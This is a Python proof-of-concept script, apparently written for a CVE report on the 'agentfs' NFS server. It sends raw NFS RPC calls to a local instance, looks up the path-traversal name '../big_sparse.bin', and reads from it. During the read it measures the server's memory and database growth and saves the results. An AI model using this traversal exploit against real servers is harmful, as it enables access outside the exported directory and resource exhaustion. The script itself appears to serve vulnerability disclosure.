#!/usr/bin/env python3
import sys, json, hashlib, datetime, subprocess, time, os
from pathlib import Path
sys.path.insert(0, '/home/teycir/Repos/agentfs-cve/pocs')
import nfs_traversal_capture as n
HOST,PORT,UID,GID='127.0.0.1',11112,0,0
NAME='../big_sparse.bin'
DB='/tmp/opencode-v064/.agentfs/v064poc.db'
WAL=DB+'-wal'
def dbsize():
    return sum(os.path.getsize(p) for p in (DB,WAL) if os.path.exists(p))
def rss():
    pid=subprocess.check_output(['pgrep','-f','agentfs serve nfs v064poc']).split()[0].decode()
    for l in open(f'/proc/{pid}/status'):
        if l.startswith('VmRSS'): return int(l.split()[1])
    return None
OUT=Path(sys.argv[1]); OUT.mkdir(parents=True,exist_ok=True)
res={"started_utc":datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z'),
     "name":NAME,"read_count":1,"db_bytes_before":dbsize(),"rss_kb_before":rss(),"samples":[]}
def rpc(prog,proc,body): return n.rpc(HOST,PORT,prog,3,proc,body,UID,GID)
idx=[0]
def rec(label,prog,proc,body):
    idx[0]+=1; r,req,resp=rpc(prog,proc,body); n.save(OUT,idx[0],label,req,resp); return r
r=rec('mnt',100005,1,n.X().s('/')); r.u32(); root=r.op()
r=rec('lookup',100003,3,n.X().op(root).s(NAME)); st=r.u32(); assert st==0,st
fh=r.op(); obj=r.attrs(); r.attrs()
res['file_size']=obj['size']
print('[+] LOOKUP',NAME,'size',obj['size'])
# sample RSS in background during READ
stop=False
def sampler():
    peak=0
    while not stop:
        v=rss()
        if v: peak=max(peak,v); res['samples'].append(v)
        time.sleep(0.05)
import threading
t=threading.Thread(target=sampler); t.start()
t0=time.time()
r=rec('read',100003,6,n.X().op(fh).u64(0).u32(1)); st=r.u32(); assert st==0,st
r.attrs(); cnt=r.u32(); eof=r.u32(); data=r.op()
el=time.time()-t0; stop=True; t.join()
res.update({"read_status":st,"read_count":cnt,"elapsed_sec":round(el,3),
            "rss_kb_after":rss(),"rss_kb_peak":max(res['samples'] or [0]),
            "db_bytes_after":dbsize(),"finished_utc":datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z')})
(OUT/'result.json').write_text(json.dumps(res,indent=2)+'\n')
print(json.dumps({k:v for k,v in res.items() if k!='samples'},indent=2))
